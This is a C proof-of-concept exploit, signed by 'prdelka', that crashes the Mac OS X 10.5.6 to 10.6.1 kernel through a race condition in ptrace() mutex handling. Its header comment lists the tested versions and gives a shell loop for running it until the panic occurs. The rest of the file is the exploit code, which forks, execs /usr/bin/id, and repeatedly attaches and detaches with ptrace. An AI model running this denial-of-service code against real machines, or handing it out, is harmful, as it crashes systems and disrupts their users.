/*
  Mac OS X 10.5.6-10.6.1 ptrace() mutex handling DoS 
  ==================================================
  This code should be run in a loop and due to problems 
  with mutex handling in ptrace a DoS can occur when a 
  destroyed mutex is attempted to be interlocked by OSX 
  kernel giving rise to a race condition. You may need
  to run this code multiple times.
  
  - Tested against 10.5.6
  - Tested against 10.5.7
  - Tested against 10.6.1

  while `true`;do ./prdelka-vs-APPLE-ptracepanic;done

  -- prdelka
*/
#include <sys/types.h>
#include <sys/ptrace.h>
#include <stdio.h>
#include <stdlib.h>


int main(){
	pid_t pid;
	char *argv[] = {"id","","",0};
	char *envp[] = {"",0};
	pid = fork();
	if(pid == 0){
		usleep(100);
		execve("/usr/bin/id",argv,envp);
	}
	else{
		usleep(820);
		if(ptrace(PT_ATTACH,pid,0,0)==0){
			printf("[ PID: %d has been caught!\n",pid);
			if(ptrace(PT_DETACH,pid,0,0)<0){
				perror("Evil happens.");
			}
			usleep(1);
			wait(0);
			}
		else{
			perror("Fail!");
		}
	}
	return(0);
}
